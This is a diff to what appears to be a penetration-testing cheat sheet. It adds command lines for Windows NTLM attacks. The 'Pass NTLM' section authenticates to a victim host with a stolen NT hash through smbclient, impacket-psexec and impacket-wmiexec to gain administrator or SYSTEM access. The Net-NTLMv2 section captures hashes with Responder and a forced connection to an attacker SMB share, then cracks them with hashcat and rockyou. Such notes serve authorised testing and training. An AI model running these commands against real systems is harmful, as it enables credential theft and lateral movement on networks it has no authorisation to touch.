@@ -67,12 +67,28 @@ hashcat -m ntlm.mode user.hash /u/s/w/rockyou.txt -r /u/s/h/r/best64.rule --forc
 
 ## Pass NTLM
 
+```
+smbclient \\\\IpVictim\\someshare -U Administrator --pw-nt-hash adminhash # smb> get file.txt
+impacket-psexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim # nt authority\system
+impacket-wmiexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim # host\administrator
+
+```
 
 ## Net-NTLMv2
 
+Kali
+```
+sudo responder -I ethX
+```
+Windows
+```
+smb \\IpAtt\fakeshare
+```
+then `hashcat`
 
 ## Relay Net-NTLMv2
 
 
+```
 
 ```
